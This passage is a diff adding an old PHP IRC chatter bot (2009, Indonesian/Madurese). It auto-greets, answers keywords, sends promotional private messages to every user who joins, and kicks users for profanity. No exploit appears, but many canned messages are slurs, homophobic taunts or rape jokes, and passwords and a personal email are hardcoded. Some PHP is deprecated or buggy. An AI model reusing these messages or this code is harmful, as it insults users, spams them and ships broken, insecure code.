@@ -1,0 +1,1338 @@
+<?php
+/***********************************
+/* jmp_crew PHPBot v2.6 By JMP    *
+/* Copyleft April 2009             *
+/* #JMP_CREW @irc.allnetwork.org  *
+/***********************************
+/* Perhatian:
+/* perintahkan ngomong hanya satu PHPBot cerewet dalam satu channel untuk menghindari terjadinya saling sapa antar bot.
+/*
+/* Perintah Dasar:
+/* auth <password> - Untuk otorisasi
+/* !j [#channel] - Join channel
+/* !p [#channel] - Part channel
+/* !msg <nick/#channel> - Mengirim pesan ke channel atau ke nick
+/* !n [nick] [password] - Mengganti nick bot
+/* !pv - promo msg in private msg 
+/* !pesan - promo msg in private msg 
+/* !ngomong - Memperbolehkan bot untuk berbicara di semua channel
+/* !sambut - Memperbolehkan bot untuk WB di semua channel
+/* !diam - Melarang bot untuk berbicara di semua channel
+*/
+
+function hajar() {
+
+$channels = '#c|nt4'; //Pisahkan tiap channel dengan spasi
+
+$showresponse = 0; //1, Nampilin respon dari server irc
+$localtest = 0; //1, Coba di localhost. 0, connect ke server irc
+$ngomong = FALSE; //TRUE, Ngomong. FALSE, Diem.
+$autowelcome = FALSE; //TRUE, AutoWelcome On. FALSE, AutoWelcome off.
+$autosambut = FALSE; //TRUE, AutoSsambut On. FALSE, AutoSambut off.
+$autopv = FALSE; //TRUE, Autopv On. FALSE, Autopv off.
+$autopesan = FALSE; //TRUE, Autopesan On. FALSE, Autoppesan off.
+
+//Nick Bot
+$nicklist = array(
+"JMP|001",
+"JMP|002",
+"JMP|003",
+"JMP|004",
+"JMP|005",
+"JMP|006",
+"JMP|007",
+"JMP|008",
+"JMP|009",
+"wewet|010",
+"wewet|0117",
+);
+$identify = "jmp"; //Password Nick Bot
+$identlist = array(
+"[c|nt4]"
+);
+$namabot = array(
+"13jmp crewet","13,5cewek jmp","6crew madura","14G1adiz kocor"
+);
+$aslbot = array(
+"18 F romanah engkok lk.9 gang setan, gogourunG village"
+);
+/*** Server IRC ***/
+if ($localtest == 1) { $remotehost2 = array("localhost"); }
+else {
+$remotehost2 = array(
+"irc.probolinggo.linuxd.org",
+
+);
+}
+$port = "6667";
+
+/*** IDENTITAS BOT ***/
+$namaku =  $namabot[rand(0,count($namabot) - 1)];
+$aslku =  $aslbot[rand(0,count($aslbot) - 1)];
+
+$awaymsg = '13 PHP BOT by jmp_crew !! 2 join aja->>3 #jmp';
+
+$wbmsg = array(
+"adoh lesoh lah <nick> deteng pole :D",
+"Webe  <nick> , semajereh otangah ",
+"wah <nick> lucu munah ratah :)",
+"Selamat Datang <nick> jeg miramih boz [c|nt4] kik tedung",
+"Webe matan sebucek <nick>",
+"Deri dimah mak Baru OL  <nick>?",
+"laa areah  <nick>malengah swempak ",
+"Met datang joy di <chan> <nick>",
+"<nick>! homo ngaleleng ",
+"hai hai <nick>! otangah majer ka b.muna",
+"Webe <nick>sejubek , q becik nieh ma amu",
+"bede se nganale,e boz [c|nt4] e. . ",
+" <nick> Hemzz malengah temun dteng pole",
+"hooeeeeeeeeee <nick> beremah kabare kek ????",
+" <nick> lucu muanah ratah!!",
+"le <nick> arapa,a mak join  <chan> ati2 dek karenah burik",
+"le Mr.tukul dteng ? ",
+"le <nick> malengah ajem ",
+"<nick> ben esareh locop polanah merkosa bot can!",
+"<nick> mak buruh ol ben kek",
+"kok pernah liat <nick> neng alun-alun ngemis??",
+"wb <nick> , olle kenalan Njek ye ?",
+"<nick> , embikx mareh eyowan ?",
+"Wibi <nick> , sumpah i becik u",
+" wb <nick> kotas lun splakz",
+"<nick> awas tukang kali kubur dteng",
+" wb <nick> , homo sejati dteng",
+"<nick> perawan tua. .xeaeaxea",
+" ayooo ngopi <nick> sambi arokok gagak hitam ",
+"<nick> malengah ajem agagagaga",
+"<nick> mun aneh2x paceplos ae",
+"hmm..colokx <nick> beu elpiji ",
+" hemmz <nick> beu sapeh",
+"<nick> wbe kek...",
+"<nick> bagi pengalaman nyopet doonk..",
+"<nick> met gabung kek",
+"<nick> wb lek..",
+"<nick> bot reh apah oreng??",
+"<nick> Mak bisa online??  HP mu kan 
+3310 express musik xaxaxa",
+"boz [c|nt4] mana ya",
+"btw, <nick> nyari boz alfin Ya?",
+"webe  <nick>,  tq dah join <chan>",
+"tmn2 semua dah kenal <nick>, dek majalah satwa kan?",
+"le area <nick> nyokbul lah  ",
+"<nick>, aduh secreme join <chan>",
+"le <nick> nyokbul lah ",
+"laah <nick> muesti pv aq wii..",
+"<nick> ojo umung2 lek aq guanteng Yeeee??",
+"muuuuuaaach, <nick> aq padamu",
+"<nick> dicari locop can merkosa bot",
+"<nick>, aq ngefans ma kamu loow",
+"nick ben mapan  <nick> kayak orangnya",
+"aduh dteng lah <nick> se homo",
+"<nick> tokang tebeseh bekoh ye. . .",
+"mak jarang join jmp ben <nick>?",
+"Wb pole lun ka secubek <nick> ",
+"awaass <nick> pernah bikin down berungah b.muna ",
+" adoh <nick> join <chan> lesoh pas ",
+"Dirasani dteng matanah <nick>",
+"wB artis cover majalah mistery",
+"WB  <nick>  tokang jueleh kotang e pasar Xaxaxaxax",
+"<nick> tukang copet neng kon b.ri reh",
+"<nick> gak usah ragu , chatingan yeh coy,",
+" <nick> wb matanah !",
+"<nick> ela jek perik acc , gendeng ji tak tao apa coy",
+"<nick> jubek celeng odik pole selak gun jmp_crew scrip , xixixi",
+"hayah, <nick> pulsana aotang , hp na kreditan",
+"tadek be.et loch tak rameh <nick> ",
+" <nick> jiakakakaka wb mr.tukul ?",
+" <nick> sapenah owan kadek jeg ol maloloh ",
+" <nick> majuh coy ajoget kadek kek..",
+"Wb <nick>  bileh ben semajereh utangah ka alfin-jmp ? xixixi",
+"Wb <nick>  kujum yuuuuuuuk",
+"WElCome BacK",
+"-[[WElCome COy11]12]-",
+"7Selamat Datang",
+"<nick> tokang conang lah deteng je",
+"<nick> tak tao mandih",
+"<nick> engak master limbat?",
+"ati ati  <nick> seneng kok mon areppuk pacarah reng laen",
+"tolooooong  <nick> mau tium AQ nie ",
+"<nick> pv aq dooooonk  ",
+"hay. . . . <nick> tadi tak nyaot eyolok reh ",
+"<nick> pernah ngicok tang swempak ! ",
+"<nick> baru keluar dari RSJ langsung chating ",
+"yang wb <nick> di beliin pulsa loch",
+"7WElcome 4to 13<chan>",
+"<nick> pernah ajuel slebereh gebey mele pulsa",
+"adoh yak lah <nick> deteng setak tao mandi",
+"<nick> mun chat ampo agelek katibik engak reng gileh ",
+"<nick> mau g TTM ma AQ ? ",
+"<nick> dicari Alfin-jmp u td coy , tapi aq bo ong :)",
+"sumpaaaaah, <nick> cakeeep bnget  loch, (mun pake helm tapi)",
+"<nick> gendeng sarah reh jet xixixixi ",
+"wB <nick> litiirrrrrrrrrrrr ",
+);
+$wbsambut = array(
+"wb <nick> met gabung coy",
+"boz alfin mana ya ??",
+"ada yg liat bozq gak ya itu loch yg tampan",
+"adoh lapar kiah awb lagelek",
+"mak muguk kiah ye awb maloloh",
+"boz alfin mana ya",
+"goyang dombreeet goyang dombret ser. . ser. . . ",
+"scrip by jmp-crew",
+"muguk awb maloloh",
+"ada yg jual plsa gak plsaq abis ni kbnyakan wb wb",
+"13Wb teman!!",
+"4Welcome Back <nick>",
+" <nick> wb",
+"<nick> malengah ajem",
+"Alfin_wardana@yahoo.com<< add fb bozq okey frend",
+"scaning homo",
+"lapaaaar",
+"Webe <nick> cuh cuh",
+"Wb plend",
+"9Met gbung",
+"Met gabung <nick>",
+"9,1WLcBcK",
+"12Wb sayaank xi xi xi",
+"chan <chan> beu klemung",
+"jangan panggil q mau tdung kok kik aganggu reh",
+"selamat achating pole kek <nick>",
+"Met Datang",
+"Webe <nick>",
+"Wibi <nick>",
+"boz [c|nt4] entar dekmah yeh",
+"Wb boz",
+);
+$wbpv = array(
+"7A14salamualaikum 12 <nick> ",
+"13Asalamualaikum.wr.wb 3 kaso.on <nick> 14 udah mampir di 
+<chan> :)",
+"11,2met gabung <nick> enjoy mon chatingan neng dinak yeh plend...",
+"14Selamat datang 6<nick>14 in  14#<chan> ",
+"9,1 bergabunglah menjadi anggota 8BJMP 11 <nick> ",
+"7,14Gabung di Fs kami yaw,, 13 Alfin_wardana@yahoo.com 12 tankz.. before... ",
+"5,1S7elamat 5r7awuh 5d7ateng 5c7han 8 <chan> 5l7onggu 5s7ampean 5p7inarak ... ",
+"9,1Thank 6 <nick> 9dah join di6 #<chan> 9Don't 6inviter,Flood,Badword,Badnick & bad2 yg lain deeh..  ",
+"11,15 SUGENG RAWUH NGGEH BOZ , JANGAN NAKAL ye bozz alfin polanah saren wa  12 <nick> :)",
+"0,1Don't inviter,spam,Flood,Badword,Badnick & bad2 yg lain 11 Enjoy chat here <nick>",
+"0,4 WELCOME COY.. 12 <chan> 9BUAT CIAPA AJA ASIK GITOCH",
+"1 Jadilah user selebur yeh12 <nick> 1Damai itu indah",
+"11,01 WELCOME BACK BOZ 12,01 GAK ADA LOCH <chan> GAK RAME LOCH",
+"6 WELCOME BACK in 7#<chan> 15klo butuh bantuan soal chan ini pv nick [c|nt4] Alfin aja okey..",
+"2,1 SLAMAT DATANG DI 0#<chan> 12Jadilah user yg baik. 10jadikan chan ini menjadi asik & menarik buat loe 11Tankz <nick> enjoy chat..:D",
+"4S12LAMAT 4D12ATANG 4D12I 4C12HAN 6#<chan> >>13Buat cari :Hay mon nyareh,pacar,ka jmp peih.wa bozz alfin kik jomblo.hahahay 12<nick>",
+);
+$jawabsapa = array(
+"apah rah matan sebucek reh aganggu teros <nick>",
+"nun",
+"maksah matanah , reah",
+"apah koh kopok reh",
+"tek lun matanah",
+"taoooh",
+"matan lok olokan maloloh !!",
+"creme reh kah kah",
+"apah coy ?",
+"apah koh kah !!!!",
+"ntek lun kik kujum kok kanak ",
+"apah seeeng ??",
+"oOoyy apah kek",
+"seg mijetin boz [c|nt4]  <nick>",
+"komet matanah <nick> reh",
+"apah <nick> mak lok olokan",
+"apah matanah <nick> ??",
+"selak <nick> reh?",
+"pura2 gak tau ah..",
+"kok kik aperik rokok ka  boz alfin ya <nick> ?",
+"cpah ben tak kenal kok ??",
+"minta kacar reh , beh beh",
+"tero ma aku ben <nick>",
+"gileh <nick> alajje bot ?",
+"<nick> tek lun",
+"gentean <nick> ai ?",
+"lek gak penting gak usah nyeluk aku to ah",
+"komet matanah <nick> reh",
+"adokah",
+"boh boh boh",
+"gayanah engak selebur je",
+"maseh bde se lok olokan ?",
+"konyek reh pagkun semeler !!!!!",
+"apah matan <nick>",
+"museng ben <nick>",
+"WhaaTz..!!",
+"dalem beb",
+"Hemz. . ."
+);
+
+/** AUTO RESPONSE ***/
+/*** Mood Lists ***/
+$$rmales = "lg males nih <nick>..";
+$rmau = "mau mau dong <nick>!";
+$rsanggup = "bisa kok <nick>";
+$rboleh = "eemhzz";
+$rsetuju = "iya <nick>";
+$rthx = "makacih <nick>..";
+$rbingung = "hmm.. aku ga tau jg nih <nick>..";
+$rgenit = "ih.. <nick> genit";
+
+$respon_umum = array(
+array("fb","Fbku --> Alfin_wardana@yahoo.com add yach plend..!!!"),
+array("cepi","ye cpi takok <nick> jie polan "),
+array("sepi","u uh sepi majuh ngacepek makle rameh <nick>"),
+array(" tha ","tha tha <nick> I miss you"),
+array("traktir","<nick>, weh dimana nihh traktiranya"),
+array("lapar","lho..? <nick> pola kik ngakan yeh?sandal mau g ?"),
+array("laper","cari maem yuk <nick>.."),
+array("luwe","kilo sandal jepit bekas arep yee? <nick>.."),
+array("pamit","dur ondur ben <nick>, tak usa join lagi yaaa?"),
+array("pamid","okey moga-moga ketemu setan lagi yaa hehehehe... <nick>"),
+array("masak"," lah tak partaje.en reh lah ekabele kik cengkal <nick>"),
+array("wekz","weh apaantu <nick>"),
+array("puh","yek apah kek <nick>"),
+array("mukuk","ye allah sapah se mukuk <nick> aq yee nyatok"),
+array("hayah","hayah?? oponeh pin <nick>?"),
+array("cinta","ka Alfin kwi dul gak nguati !!"),
+array("pamet","hust <nick> dur dur"),
+array("pamed","oke <nick>, dur hust hust selak perak ben?"),
+array("ngantuk","sana bobok sma alfin nuh <nick>"),
+array("quit","okey <nick> join cini lagi yaa"),
+array("askum","Wa'alaikumsalam <nick>"),
+array("asalamualaikum","Wa'alaikumsalam <nick>"),
+array("!seen ","tak usa seen  senah ra<nick> males kok"),
+array(".seen ","tak monyet reh seen teroz?? <nick> "),
+array("siang","siang keah <nick>"),
+array("awoh","amin amin <nick>"),
+array("weks","<nick> apanah seng weks"),
+array("halah","alah GLERRRRRRRR we <nick> "),
+array("jah","jah apanah rah <nick> "),
+array("pagi","boz alfin kik tak bngun lo pagi <nick>"),
+array("sore","kalo sore boz q [c|nt4] maen bola <nick>"),
+array("malam","malam keah matanah <nick> ??"),
+array("malem","malem jg <nick>"),
+array("asalamuallaikum","wallaikumsalam <nick>"),
+array("mandi","noro.ah mandi kok ey hayoow??"),
+array("boh","<nick>  kok mutungan tow"),
+array("sayank","cinta ka boz alfin <nick> dia mesra "),
+array("cayank","ke Alfin ye?dia stia kok <nick>"),
+array("sayang","sayang kepala loch peang ! <nick> "),
+array("mati","innalilahi......"),
+array("kangen","<nick> kangen ka alfin ye"),
+array("!ping","ping ping ka apah adek botah mateh ?"),
+array("[c|nt4]","<nick> suka ma boz [c|nt4] ya"),
+array("hemz","padeh pereng sapeh ben <nick> ?"),
+array("nik","naksir ma boz alfin ya <nick> ?"),
+array("rawun","rawun,soto,bakso,mie bungkus <nick> !! yah "),
+array("mz","yualah <nick> lak melazz"),
+array("meong","puuuuuuuussss yew <nick> ?"),
+array("love","love ben seneng ka alfin ye?"),
+array("lope","amit amit jabang bayik we <nick>"),
+array("xixi","pagele,na engak kuntilanak <nick>"),
+array("gagagaga","agagag can colo,en beu elpiji <nick> "),
+array("wkwkwkwk","bebek anyaran we <nick>"),
+array("haha","huh colo,en beceng ben  <nick> !!"),
+array("hohoho","lah tak bisa akekep colon reh!!"),
+array("bot","aq loh  <nick> botx anak2 jmp "),
+array("rokok","mun rokok olenah otang tak usa lebele <nick> ?"),
+array("hehehe"," <nick> liat boz alfin yg gnteng gak"),
+array("emoh","lak emoh digujer ae wi <nick>"),
+array("berhasil","pcarx mz alfin Ea <nick>"),
+array("yualah","seberes ngala ey mek ngomuk jih <nick>"),
+array("homo","jauh2 ma <nick> dia suka sesama jenis kabuuurrr"),
+array("weeh","puja.an htmu alfin Ea..<nick>"),
+array("herek","ambek laok <nick> ngicok ajem "),
+array("bot","colo.et bot.be.et je user gendeng <nick> "),
+array("nyanyi","ella jek nyanyi ! suaramu fals <nick> !!"),
+array("bot","gaya ben engak sepenter  <nick>"),
+array("ngantok","cuci muka dulu sana <nick> biar seger gt"),
+array("bot","kok beni bot seng kok user sebaeg ??"),
+array("adus","layak mambu kecing aq"),
+array("kecing","berarti we bakul tahu <nick>"),
+array("guyu","oleh guyu pokok mingkeeeeem !!"),
+array("nakal","ancen cah nduablek wi"),
+array("wakakaka"," <nick> agelek tok colokx engak berkong"),
+array("mwuah","waduuh kenek sandalku loch"),
+array("mwuuach","genit amat sih loe"),
+array("mwuuah","wa boz alfin tium"),
+array("macet","sotok rah ka songai makle lancar, sinyale rebutan wi!"),
+array("matet","guwak en ae hpmu !"),
+array("muah"," <nick> endel"),
+
+
+);
+
+$respon_pesan = array(
+//Sapaan
+array("hai ","hai keah <nick>"),
+array("halo ","halo keah <nick>"),
+array("alow","alow keah <nick>"),
+array("pin","ada perlu apa <nick>? manggil boz alfin"),
+array("kbr","baik, km gmn <nick>?"),
+array("webe","$rthx"),
+array("wb","$rthx"),
+array("tq","cami2 <nick>"),
+array("makasi","sama2 <nick>"),
+array("makaci","oque <nick>"),
+array("nalin","hai.. aku $namaku"),
+array("nalkan","hai.. aku $namaku"),
+array("nalan","boleh koq <nick>.. u one"),
+//Identitas
+array("asl ","<nick>, aku $aslku"),
+array("umur","<nick>, klo aq $aslku"),
+array("nama","<nick>, aku $namaku .. u?"),
+array("skul ","yup <nick>, aku skul."),
+array(" kul ","<nick>, ga kul neh.."),
+array("alamat","hmm.. rahasia donk <nick>.."),
+array("rumah","hmm.. rahasia donk <nick>.."),
+array("nak mana","aQ $aslku <nick>"),
+array(" tinggal ","<nick>, aku di rumah"),
+array("cowok","blom, klo <nick>?"),
+array("cow","blom, klo <nick> gmn?"),
+array("pcr","blom, hihi.. klo <nick>?"),
+array("pacaran","emangnya <nick> mau y pacaran ma aku?"),
+array("pacar ","blom, <nick> ndiri gmn?"),
+array("pv","$rmales"),
+array("ngomong","ngomong ttg apa <nick>?"),
+array("wawen","wew mangx aq cew apakah?"),
+array("curhat","mangnya mo curhat masalah apa <nick>?"),
+array("nikah ","nikah? ih.. boro2 nikah ma <nick>"),
+array("kawin ","gak dech <nick>"),
+array("kencan","emoooh ! we elek nuk <nick>"),
+array("besok","moh <nick>.."),
+array("sesok","ah kpn2 aja <nick> lek eleng ahaa.."),
+array("mau ","$rmau"),
+//Tuduhan
+array("bohong","bohong? ngpn Q bohong.. <nick> kali yg bohong.."),
+array("boong","boong? <nick> tuh yg boong.."),
+array("males","yaa.. lagi males aja nih <nick>"),
+array("lain","yg lain gmn <nick> ?"),
+array("ngosek","ngosek beras po ngosek gndulmu <nick> !"),
+array("laen","yg laen gmn <nick>?"),
+array("sok t","yaa gitu dech <nick> aq kan smart"),
+array("kemeruh","timbang <nick> kompor mobal"),
+array("nyambung","<nick>nya aja yg ga nyambung.. xixi"),
+array("bot","bot itu apaan yach ?? yg gmn sihh??"),
+array("aneh","aneh gmn <nick>?"),
+//Kegiatan
+array("mandi","mau mandi aq lagi lepas baju nih <nick> bantuin donk"),
+array("makan","udah koq <nick>, klo <nick>?"),
+array("maem","iya nih lagi maem, mau tak saapin <nick>?"),
+array("mkn","udah neh, klo <nick>?"),
+array("gelot","ayow loo bacokan yow <nick>?"),
+array("bobo ","$rmales"),
+array("tidur ","$rmales"),
+array("ngantuk ","blom neh <nick>.. xixi"),
+array("ngpn","lg chat aja neh <nick>"),
+array("ngapa","lg chat aja neh <nick>"),
+//Pertanyaan
+array("salam kenal ","salam kenal jg <nick>"),
+array("kenal ","$namaku ga kenal tuh.. xixi"),
+array("tau ","$namaku ga tau tuh.. xixi"),
+array("napa","aq ga knp2 koq <nick>"),
+array("knp","aq ga knp2 koq <nick>"),
+array("kemana","disini aja tuh <nick>"),
+array("lupa","aq ga lupa koq <nick>"),
+array(" mana ","$rbingung"),
+//Persetujuan
+array("maaf","$rsetuju"),
+//Mood
+array("cinta","ih.. <nick> gombal amoh deh.."),
+array("love","love g deh kayaknya <nick>"),
+array("jodoh","jodoh kalee <nick>"),
+array("kangen","emang Qta pernah kenal ya <nick>"),
+array("muach","woloh2 <nick>.."),
+array("muaach","wesz kena sandalq tuh"),
+array("kiss","kiss takut aq g pernah ow <nick>"),
+array("cium","$rgenit"),
+array("eluk","$rgenit"),
+array("elonin","jgn donk <nick>, kan malu.."),
+//Additional
+array("kok diem","aq emang pendiem kok <nick>"),
+array("xixi","ngetawain aku y <nick>?"),
+array("slap","kejem <nick> !"),
+array(" masuk ","ih <nick> ngerezz"),
+);
+
+//Special Words
+$badwordlist = array(
+"pokeh","jancok","palak","dancok","setan","danco","pepek","tempek","kontol","celeh","ngloco","vagina","orgasme","conang","onani",
+"anjrit","ancrit","fuck","dampot","ngentot","vevek","hampot","sex","kontol","ngesex"," ml ","anjenk","vagina",
+"anjink","anjing","asu ","tempos","matane","kawen","wawen","ilid","gancok","hasu ","cileh","matamu ","tempex",
+"dampod","tempik","penis","turuk","dancuok","mwuahtamu","dancix","ancik","raimu","itel"," rempon",
+"dancuok","pejoh","pejuh","vevex","fuck","ganjingi","kentu","ngosek","raimu","ancik","ancox","tempiek","kontuol","tempi");
+
+$pujianlist = array("cantik","baik","baek","cakep","ramah","pengertian","hebat","bagus","sweet","pinter","pintar");
+$cacianlist = array("bego","kemeruh","jelek","jelex","gendeng","edan","godul","gila","sinting","dudul","dodol","jahat","goblok","geblek","elek","dudul","kemlutuk","stres","strez");
+
+//Responses to Special Words
+$rjorok = array(
+"<nick> Ya Allah ikstifar matan ",
+"Dijaga ra colokx jie <nick>",
+"Waduh <nick> ga sopan kacar aja tuh.."
+);
+$rcacian = array(
+"idih, <nick> tuch yg <kata>",
+"<kata>? bukanya <nick> tuh yg <kata>?",
+"gw mmg <kata>, tp <nick> lebih <kata> lagi",
+"gw ga <kata> tuh, yg <kata> itu <nick> kan?"
+);
+$rpujian = array(
+"makasih <nick>.. kamu baik dech",
+"<nick> waduh mumbul aq",
+"gak kok <nick>.. aah jadi malu",
+"<kata>? hihi.. <nick> bisa aja"
+);
+$rflood = "ancox!! <nick> ngeflood..! garai lemot suu! ";
+$maxkar = 150; //Maksimal karakter di channel
+
+$quitmsglist = array("Tha..tha..cemeuanya semoga ketemu lagi oke");
+
+/*** Admin ***/
+$admin = '[c|nt4]';
+$bot_password = 'kocor'; //Password untuk auth bot
+
+/*** Replacement ***/
+$nick = $nicklist[rand(0,count($nicklist) - 1)];
+$realname = $namaku;
+$remotehost = $remotehost2[rand(0,count($remotehost2) - 1)];
+$channels = str_replace("CNL","#",$channels);
+$admin = strtolower($admin);
+$auth = array(
+    $admin => array(
+        "name" => $admin,
+        "pass" => $bot_password,
+        "auth" => 1,
+        "status" => "Admin"
+    )
+);
+$username = $identlist[rand(0,count($identlist) - 1)];
+$channels = strtolower($channels)." ";
+$channel = explode(" ", $channels);
+/*** Kode Utama ***/
+define ('CRL', "\r\n"); //Carriage Return
+$counterfp = 0;
+$raway = "on";
+$log   = "off";
+$saway = "1";
+$keluar = 0;
+$akill  = 1;
+$katime = 0;
+$localhost = 'localhost';
+$dayload = date("H:i:s d/m/Y");
+ini_set('user_agent','MSIE 5\.5;');
+set_time_limit(0);
+
+if (!$stime) { $stime = time(); }
+
+/*** Connecting ***/
+echo "<body bgcolor=#000000 text=#00FF00>";
+echo "<b>Melakukan koneksi ke $remotehost...</b>";
+
+do {
+  $fp = fsockopen($remotehost,$port, &$err_num, &$err_msg, 30);
+  //Jika koneksi gagal
+  if(!$fp) { 
+    if ( $counterfp <= 200 ) {
+      $counterfp = $counterfp + 1;
+      hajar($nick);
+    }
+    else {
+      echo "<br><b>dancok Ga iso connect ke $remotehost! Coba server lain dgn me-Refresh Browser anda!</b>";
+      $keluar = 1;
+      exit;
+    }
+  }
+  echo "<br><b>DANCOOOOKK Kenek targete !</b>";
+  /*** Sending Identity to Sock ***/
+  $header = 'NICK '.$nick . CRL;
+  $header .= 'USER '.$username.' '.$localhost.' '.$remotehost.' :'.$realname . CRL;
+  fputs($fp, $header);
+  $response = '';
+  /*** Receiving Packet ***/
+  while (!feof($fp)) {
+    $response .= fgets($fp, 1024);
+    if ($showresponse == 1) { echo "<br>".$response; }
+    while (substr_count($response,CRL) != 0) {
+      $offset = strpos($response, CRL);
+      $data = substr($response,0,$offset);
+      $response = substr($response,$offset+2);
+      if (substr($data,0,1) == ':') {
+        $offsetA = strpos($data, ' ');
+        $offsetB = strpos($data, ' :');
+        $offsetC = strpos($data, '!');
+        $dFrom = substr($data,1,$offsetA-1);
+        $dCommand = substr($data,$offsetA+1,$offsetB-$offsetA-1);
+        $dNick = substr($data,1,$offsetC-1);
+        $iText = substr($data,$offsetB+2);
+        /*** Server Notices Handling ***/
+        if ( substr($dCommand,0,3) == '004' ) {
+          fputs($fp, 'PRIVMSG nickserv :identify '.$nick.' '.$identify.  CRL);
+          if ($nickmode) { fputs($fp, 'MODE '.$nick.' :'.$nickmode . CRL); }
+          /*** Notice Bot Admin ***/
+          fputs($fp, 'NOTICE ' . $admin . ' :Boss, gue masuk nih!' .  CRL);
+          /*** Join Default Channel ***/
+          foreach ($channel as $v) {
+            fputs($fp, 'JOIN ' .$v . CRL);
+          }
+          $pong1 = '1';
+        }
+        elseif (substr($dCommand,0,3)=='432') {
+          $nick = $nick.$username;
+		  fputs($fp, 'NICK '.$nick . CRL);
+        }
+        //Nickname is already in use
+        elseif (substr($dCommand,0,3)=='433') {
+          $nick = $nicklist[rand(0,count($nicklist) - 1)].$identlist[rand(0,count($identlist) - 1)];
+          fputs($fp, 'NICK '.$nick . CRL);
+        }
+        elseif (substr($dCommand,0,3)=='465') {
+          echo "<br><b>Bot ini telah di-autokilled.</b>";
+          $akill = 2;
+        }
+	    if (eregi('.allnetwork.org',$dNick) && $akill==2) {
+          if (eregi('AKILL ID: ',$data)) {
+            echo "<br><b>".strstr($data,'***')." </b>";
+            if (eregi('Your IP: ',$data)) {
+              $keluar = 1;
+              exit;
+            }
+          }
+        }
+        //*** PHP BOT CEREWET SCRIPT BY [c|nt4] ***
+        $dcom = explode(" ", $dCommand);
+        if ($dcom[0]=='JOIN') {
+          /*** Auto Welcome by [c|nt4] ***/
+          if (($autowelcome) && ($dNick != $nick)) {
+            $jchan = ltrim($iText,":");
+            $webe = $wbmsg[rand(0,count($wbmsg) - 1)];
+            $webe = str_replace("<nick>",$dNick,$webe);
+            $webe = str_replace("<chan>",$jchan,$webe);
+            $webe = str_replace("#","",$webe);
+            fputs($fp,'PRIVMSG '.$jchan.' :'.$webe . CRL);
+          }
+        }
+        if ($dcom[0]=='JOIN') {
+          /*** Auto sambut by [c|nt4] ***/
+          if (($autosambut) && ($dNick != $nick)) {
+            $jchan = ltrim($iText,":");
+            $webek = $wbsambut[rand(0,count($wbsambut) - 1)];
+            $webek = str_replace("<nick>",$dNick,$webek);
+            $webek = str_replace("<chan>",$jchan,$webek);
+            $webek = str_replace("#","",$webek);
+            fputs($fp,'PRIVMSG '.$jchan.' :'.$webek . CRL);
+          }
+        }
+        if ($dcom[0]=='JOIN') {
+          /*** Auto pesan in PV by [c|nt4] ***/
+          if (($autopv) && ($dNick != $nick)) {
+            $jchan = ltrim($iText,":");
+            $webepv = $wbpv[rand(0,count($wbpv) - 1)];
+            $webepv = str_replace("<nick>",$dNick,$webepv);
+            $webepv = str_replace("<chan>",$jchan,$webepv);
+            $webepv = str_replace("#","",$webepv);
+            fputs($fp,'PRIVMSG '.$dNick.' :'.$webepv . CRL);
+          }
+        }
+        if ($dcom[0]=='JOIN') {
+          /*** Auto pesan in NOTICE by [c|nt4] ***/
+          if (($autopesan) && ($dNick != $nick)) {
+            $jchan = ltrim($iText,":");
+            $webeps = $wbpv[rand(0,count($wbpv) - 1)];
+            $webeps = str_replace("<nick>",$dNick,$webeps);
+            $webeps = str_replace("<chan>",$jchan,$webeps);
+            $webeps = str_replace("#","",$webeps);
+            fputs($fp,'NOTICE '.$dNick.' :'.$webeps . CRL);
+          }
+        }
+        if ($dcom[0]=='PRIVMSG') {
+          /*** Auto Response by [c|nt4] ***/
+          if ($ngomong) {
+            $teman = FALSE;
+            foreach($nicklist as $temanku){
+              if (strtolower($dNick)==strtolower($temanku)) { $teman = TRUE; }
+            }
+            if (!$teman) {
+              $pesan = ltrim($iText,":");
+              $pesan = strtolower($pesan);
+              if ((substr_count($pesan,strtolower($nick))>0)OR(substr_count($pesan,strtolower($namaku))>0)) {
+                $ada = FALSE;
+                /*** Normal Response ***/
+                foreach ($respon_pesan as $rpesan) {
+                  $trtext = strtolower($rpesan[0]);
+                  if (substr_count($pesan,$trtext) > 0) {
+                    $rpesan[1] = str_replace("<nick>",$dNick,$rpesan[1]);
+                    fputs($fp,'PRIVMSG '.$dcom[1].' :'.$rpesan[1]. CRL);
+                    $ada = TRUE;
+                  }
+                }
+                /*** Pujian Response ***/
+                foreach ($pujianlist as $rpesan) {
+                  $trtext = strtolower($rpesan);
+                  if (substr_count($pesan,$trtext) > 0) {
+                    $jawab = $rpujian[rand(0,count($rpujian) - 1)];
+                    $jawab = str_replace("<nick>",$dNick,$jawab);
+                    $jawab = str_replace("<kata>",$trtext,$jawab);
+                    fputs($fp,'PRIVMSG '.$dcom[1].' :'.$jawab. CRL);
+                    $ada = TRUE;
+                  }
+                }
+                /*** Cacian Response ***/
+                foreach ($cacianlist as $rpesan) {
+                  $trtext = strtolower($rpesan);
+                  if (substr_count($pesan,$trtext) > 0) {
+                    $jawab = $rcacian[rand(0,count($rcacian) - 1)];
+                    $jawab = str_replace("<nick>",$dNick,$jawab);
+                    $jawab = str_replace("<kata>",$trtext,$jawab);
+                    fputs($fp,'PRIVMSG '.$dcom[1].' :'.$jawab. CRL);
+                    $ada = TRUE;
+                  }
+                }
+                if (!$ada) {
+                  $sapalagi = $jawabsapa[rand(0,count($jawabsapa) - 1)];
+                  $sapalagi = str_replace("<nick>",$dNick,$sapalagi);
+                  fputs($fp,'PRIVMSG '.$dcom[1].' :'.$sapalagi . CRL);
+                }
+              }
+              else {
+                /*** Global Response ***/
+                foreach ($respon_umum as $rpesan) {
+                  $trtext = strtolower($rpesan[0]);
+                  if (substr_count($pesan,$trtext) > 0) {
+                    $rpesan[1] = str_replace("<nick>",$dNick,$rpesan[1]);
+                    fputs($fp,'PRIVMSG '.$dcom[1].' :'.$rpesan[1]. CRL);
+                  }
+                }
+                /*** Bad Response & Kick ***/
+                foreach ($badwordlist as $rpesan) {
+                  $trtext = strtolower($rpesan);
+                  if (substr_count($pesan,$trtext) > 0) {
+                    $jawab = $rjorok[rand(0,count($rjorok) - 1)];
+                    $jawab = str_replace("<nick>",$dNick,$jawab);
+                    $jawab = str_replace("<kata>",$trtext,$jawab);
+                    fputs($fp,'PRIVMSG '.$dcom[1].' :'.$jawab. CRL);
+                    fputs($fp,'MODE '.$dcom[1].' +b '.$dNick.''. CRL);
+                    fputs($fp,'KICK '.$dcom[1].' '.$dNick.' :Mohon sopan dikit donk '.$dNick.'!!'. CRL);
+                    fputs($fp,'NOTICE '.$dNick.' :4Dunk Tau dipisui wong bisu to kowe AnYoOoOX ii...!'. CRL);
